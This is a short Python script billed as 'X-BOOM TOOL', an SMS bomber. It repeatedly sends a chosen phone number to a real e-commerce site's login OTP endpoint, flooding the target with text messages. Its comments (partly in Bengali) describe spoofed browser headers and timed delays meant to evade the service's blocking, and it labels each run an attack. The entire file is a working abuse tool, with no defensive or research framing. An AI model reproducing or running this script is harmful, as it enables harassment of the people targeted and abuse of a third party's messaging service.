import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: 100% WORKING API           ")
    print("========================================")

def send_sms(target, count):
    # সচল Daraz API
    url = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
    
    # Headers যা ব্লক হওয়া আটকাবে
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Content-Type": "application/json"
    }
    
    payload = {"phoneNumber": target, "otpType": "LOGIN"}
    
    print(f"\n[+] Attack started on: {target}")
    for i in range(count):
        try:
            # POST Request sending
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                print(f"[!] SMS {i+1} sent successfully!")
            else:
                print(f"[?] Server Busy/Limit - SMS {i+1}")
        except:
            print(f"[-] Network Error at SMS {i+1}")
        
        time.sleep(3) # ৩ সেকেন্ড গ্যাপ দিলে ব্লক হবে না

def main():
    banner()
    print("\n[1] Start SMS Bomber")
    print("[2] Exit")
    choice = input("\nSelect: ")
    if choice == '1':
        number = input("Number (01xxxxxxxxx): ")
        amount = int(input("Amount: "))
        send_sms(number, amount)
        print("\n[+] Done!")
    else:
        print("Exiting...")

if __name__ == "__main__":
    main()

